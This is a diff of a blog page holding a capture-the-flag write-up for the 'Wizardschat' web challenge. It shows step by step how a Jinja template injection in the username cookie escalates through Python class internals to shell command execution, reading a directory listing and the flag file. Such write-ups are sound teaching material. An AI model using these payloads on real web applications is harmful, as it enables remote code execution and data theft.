@@ -1,4 +1,46 @@
-I"��<h2><img src="./screenshots/Wizardschat.png" alt="Wizardschat (300 pts)" /></h2>
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    
+    
+    
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>jebidiah-anthony</title>
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="jebidiah-anthony" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/chals/ctf/2019_TG:Hack/web/5_Wizardschat.html" />
+<meta property="og:url" content="http://localhost:4000/chals/ctf/2019_TG:Hack/web/5_Wizardschat.html" />
+<meta property="og:site_name" content="jebidiah-anthony" />
+<script type="application/ld+json">
+{"@type":"WebPage","url":"http://localhost:4000/chals/ctf/2019_TG:Hack/web/5_Wizardschat.html","headline":"jebidiah-anthony","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>jebidiah-anthony</h1>
+        <h2>write-ups and what not</h2>
+
+	<span>
+	  <a href="/">whoami</a> | 
+          <a href="/htb.html">htb writeups</a> | 
+	  <a href="/ctf.html">ctf writeups</a> | 
+	  <a href="/projects.html">projects</a> 
+	</span>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2><img src="./screenshots/Wizardschat.png" alt="Wizardschat (300 pts)" /></h2>
 <h2 id="challenge-info">CHALLENGE INFO</h2>
 <ul>
   <li><strong>CHALLENGE LINK</strong>: https://wizardschat.tghack.no/</li>
@@ -58,7 +100,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
     <p><strong>Notes</strong>:</p>
     <ul>
       <li>The chat filters <strong>”&lt;”</strong> and <strong>”&gt;”</strong> to <strong>\&lt;</strong> and <strong>\&gt;</strong> respectively</li>
-      <li>The chat retains <em>__</em> but does not interpret them.</li>
+      <li>The chat retains <strong>{{ }}</strong> but does not interpret them.</li>
       <li>The chat seems to be a rabbit hole.
         <ul>
           <li>All messages sent by users are output through the chat.</li>
@@ -79,7 +121,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__ }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -109,7 +151,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__ }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -135,7 +177,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__() }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -156,7 +198,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__()[181] }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -177,7 +219,7 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
         <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
 <span class="na">Host</span><span class="p">:</span> <span class="s">wizardschat.tghack.no</span>
 <span class="s">...</span>
-<span class="na">Cookie</span><span class="p">:</span> <span class="s">username=</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">username={&#123; self.__class__.__mro__[-1].__subclasses__()[181]("id", shell=True, stdout=-1).communicate() }}</span>
 <span class="s">...</span>
 </code></pre></div>        </div>
       </li>
@@ -198,8 +240,8 @@ Username: <span class="nt">&lt;input</span> <span class="na">type=</span><span c
 
 <h2 id="step-4--extract-the-flag">Step 4 : Extract the flag</h2>
 
-<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">payload</span><span class="o">=</span><span class="s2">""</span>
-curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&amp;/p'</span>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">payload</span><span class="o">=</span><span class="s2">"{&#123; self.__class__.__mro__[-1].__subclasses__()[181](</span><span class="se">\"</span><span class="s2">ls -la</span><span class="se">\"</span><span class="s2">, shell=True, stdout=-1).communicate() }}"</span>
+curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&/p'</span>
 
 <span class="c"># total 28</span>
 <span class="c"># drwxr-xr-x    1 root     root        4.0K Apr 18 16:48 .</span>
@@ -210,11 +252,26 @@ curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="n
 <span class="c"># -rwxr-xr-x    1 root     root          29 Apr 18 14:00 requirements.txt</span>
 <span class="c"># -rwxr-xr-x    1 root     root         827 Apr 16 07:09 upload.php</span>
 
-<span class="nv">payload</span><span class="o">=</span><span class="s2">""</span>
-curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&amp;/p'</span>
+<span class="nv">payload</span><span class="o">=</span><span class="s2">"{&#123; self.__class__.__mro__[-1].__subclasses__()[181](</span><span class="se">\"</span><span class="s2">cat ./flag.txt</span><span class="se">\"</span><span class="s2">, shell=True, stdout=-1).communicate() }}"</span>
+curl <span class="nt">-b</span> <span class="s2">"username=</span><span class="nv">$payload</span><span class="s2">"</span> https://wizardschat.tghack.no/ | <span class="nb">sed</span> <span class="nt">-ne</span> <span class="s1">'s/^.*Username:\(.*\)$/&/p'</span>
 
-<span class="c"># Username: (b&amp;#39;TG19{templates_make_a_better_chat}\n&amp;#39;, None)</span>
+<span class="c"># Username: (b&#39;TG19{templates_make_a_better_chat}\n&amp;#39;, None)</span>
 </code></pre></div></div>
 <hr />
 <h2 id="flag--tg19templates_make_a_better_chat">FLAG : <strong>TG19{templates_make_a_better_chat}</strong></h2>
-:ET
+
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'true', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
